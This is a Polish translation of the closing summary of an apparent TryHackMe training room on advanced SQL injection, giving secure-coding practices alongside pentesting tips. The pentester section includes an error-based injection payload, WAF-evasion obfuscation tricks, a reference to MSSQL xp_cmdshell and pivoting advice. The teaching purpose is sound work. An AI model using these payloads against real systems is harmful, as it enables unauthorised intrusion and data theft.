SQLWstrzyknięcie kodu (SQL injection) to znana i powszechna luka w zabezpieczeniach, która od lat stanowi poważny problem w zakresie bezpieczeństwa aplikacji internetowych. Pentesterzy muszą zwracać na nią szczególną uwagę podczas oceny, ponieważ wymaga ona dogłębnej znajomości różnych technik identyfikacji i wykorzystania punktów wstrzyknięcia kodu SQL. Podobnie, programiści odpowiedzialni za bezpieczeństwo muszą priorytetowo traktować ochronę swoich aplikacji, wdrażając solidną walidację danych wejściowych i przestrzegając bezpiecznych praktyk kodowania, aby zapobiec takim atakom. Poniżej wymieniono kilka najlepszych praktyk: ![najlepsze praktyki dla bezpiecznych programistów|700](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716989793902)

Bezpieczni koderzy

- **Zapytania sparametryzowane i instrukcje przygotowane** : Użyj zapytań sparametryzowanych i instrukcji przygotowanych, aby zapewnić, że wszystkie dane wejściowe użytkownika będą traktowane jako dane, a nie jako kod wykonywalny. Ta technika pomaga zapobiegać atakom typu SQL injection poprzez oddzielenie struktury zapytania od danych. Na przykład wPHPza pomocą PDO można przygotować polecenie i powiązać parametry, co gwarantuje, że dane wejściowe użytkownika będą obsługiwane bezpiecznie, jak np `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $username]);`. .
- **Walidacja i sanityzacja danych wejściowych** : Wdrażaj rygorystyczną walidację i sanityzację danych wejściowych, aby zapewnić ich zgodność z oczekiwanymi formatami. Waliduj typy danych, długości i zakresy oraz odrzucaj dane wejściowe, które nie spełniają tych kryteriów. Korzystaj z wbudowanych funkcji, takich jak `htmlspecialchars()`i `filter_var()`w PHP, aby skutecznie sanityzować dane wejściowe.
- **Zasada najmniejszych uprawnień** : Stosuj zasadę najmniejszych uprawnień, przyznając kontom aplikacji minimalne niezbędne uprawnienia do bazy danych. Unikaj używania kont baz danych z uprawnieniami administracyjnymi do codziennych operacji. Minimalizuje to potencjalny wpływ udanego ataku typu SQL injection poprzez ograniczenie dostępu atakującego do krytycznych funkcji bazy danych.
- **Procedury składowane** : Hermetyzacja i walidacja logiki SQL za pomocą procedur składowanych. Pozwala to kontrolować i walidować dane wejściowe w samej bazie danych, zmniejszając ryzyko ataku typu SQL injection. Upewnij się, że procedury składowane akceptują wyłącznie zweryfikowane dane wejściowe i są zaprojektowane do wewnętrznej obsługi sanityzacji danych wejściowych.
- **Regularne audyty bezpieczeństwa i przeglądy kodu** : Przeprowadzaj regularne audyty bezpieczeństwa i przeglądy kodu, aby identyfikować i usuwać luki w zabezpieczeniach. Zautomatyzowane narzędzia mogą pomóc w skanowaniu w poszukiwaniu zagrożeń związanych z atakami SQL injection, ale ręczne przeglądy są również niezbędne do wykrycia subtelnych problemów. Regularne audyty zapewniają, że Twoje praktyki bezpieczeństwa są aktualne i dostosowują się do zmieniających się zagrożeń.

Pentesterzy

- **Wykorzystanie funkcji specyficznych dla baz danych** : Różne systemy zarządzania bazami danych (DBMS) mają unikalne funkcje i składnię. Pentester powinien rozumieć specyfikę docelowego systemu DBMS (np. MySQL, PostgreSQL, Oracle, MSSQL), aby skutecznie wykorzystać te funkcje. Na przykład MSSQL obsługuje polecenie `xp_cmdshell`, które może być używane do wykonywania poleceń systemowych.
- **Wykorzystanie komunikatów o błędach** : Wykorzystaj rozbudowane komunikaty o błędach, aby uzyskać wgląd w schemat i strukturę bazy danych. Ataki typu SQL injection oparte na błędach polegają na prowokowaniu aplikacji do generowania komunikatów o błędach, które ujawniają przydatne informacje. Na przykład użycie 1' AND 1=CONVERT(int, (SELECT @@version)) może generować błędy, które ujawniają informacje o wersji.
- **Omijanie WAF i filtrów** : Przetestuj różne techniki zaciemniania, aby ominąć zapory sieciowe aplikacji internetowych (WAF) i filtry wejściowe. Obejmuje to użycie mieszanych wielkich i małych liter (SeLeCt), konkatenacji (CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84)) oraz kodowania alternatywne (szesnastkowe, kodowanie URL). Dodatkowo, użycie komentarzy w tekście (/**/) i różnych kodowań znaków (np. %09, %0A) może pomóc w ominięciu prostych filtrów.
- **Odcisk palca bazy danych** : Określ typ i wersję bazy danych, aby dostosować atak. Można to zrobić, wysyłając konkretne zapytania, które dają różne wyniki w zależności od systemu DBMS. Na przykład polecenie SELECT version() działa w systemie PostgreSQL, a polecenie SELECT @@version działa w systemach MySQL i MSSQL.
- **Pivoting z wykorzystaniem wstrzyknięcia SQL** : Użyj wstrzyknięcia SQL, aby obrócić i wykorzystać inne części sieci. Po włamaniu na serwer bazy danych, może on zostać wykorzystany do uzyskania dostępu do innych systemów wewnętrznych. Może to wiązać się z wydobyciem danych uwierzytelniających lub wykorzystaniem relacji zaufania między systemami.

Zaawansowane testy SQL Injection wymagają dogłębnej znajomości różnych technik i umiejętności adaptacji do zróżnicowanych środowisk. Pentesterzy powinni stosować różne metody, od wykorzystywania funkcji specyficznych dla bazy danych, przez omijanie zaawansowanych filtrów, po dogłębną ocenę i wykorzystanie luk w zabezpieczeniach SQL injection. Metodyczne dokumentowanie każdego kroku zapewnia kompleksową ocenę bezpieczeństwa aplikacji.

W tym pokoju zapoznaliśmy się z kilkoma zaawansowanymi technikami SQL injections, w tym wstrzykiwanie kodu SQL drugiego rzędu, poza pasmem SQLi obchodzenie filtrów. Omówiliśmy również techniki takie jak wstrzykiwanie plików cookie, ilustrując różnorodne metody wykorzystywane przez atakujących do wykorzystywania luk w zabezpieczeniach aplikacji internetowych. Nasza podróż nie zakończyła się na samej eksploatacji; omówiliśmy znaczenie automatyzacji w identyfikowaniu i wykorzystywaniu luk w zabezpieczeniach związanych z wstrzykiwaniem kodu SQL oraz wykorzystywaniu narzędzi do usprawnienia i ulepszenia naszych procesów testowania.  

Zrozumienie tych zaawansowanych technik jest kluczowe dla każdego testera penetracyjnego, który dąży do wykrycia i usunięcia złożonych luk w zabezpieczeniach. Omówiliśmy również różne środki zaradcze, chroniące aplikacje przed tymi zaawansowanymi atakami, podkreślając potrzebę solidnego zabezpieczenia.

Jako tester penetracyjny, Twoja rola polega nie tylko na wyszukiwaniu luk w zabezpieczeniach, ale także na zrozumieniu najlepszych praktyk ich usuwania i zapobiegania. Uzbrojony w wiedzę zdobytą w tym miejscu, będziesz lepiej przygotowany do ochrony aplikacji internetowych, zapewniając ich odporność na zmieniające się zagrożenia typu SQL injection.

Daj nam znać, co myślisz o tym pokoju na naszym [Discordzie(otwiera się w nowej karcie)](https://discord.com/invite/tryhackme)kanał lub [konto X(otwiera się w nowej karcie)](https://twitter.com/RealTryHackMe)Do zobaczenia.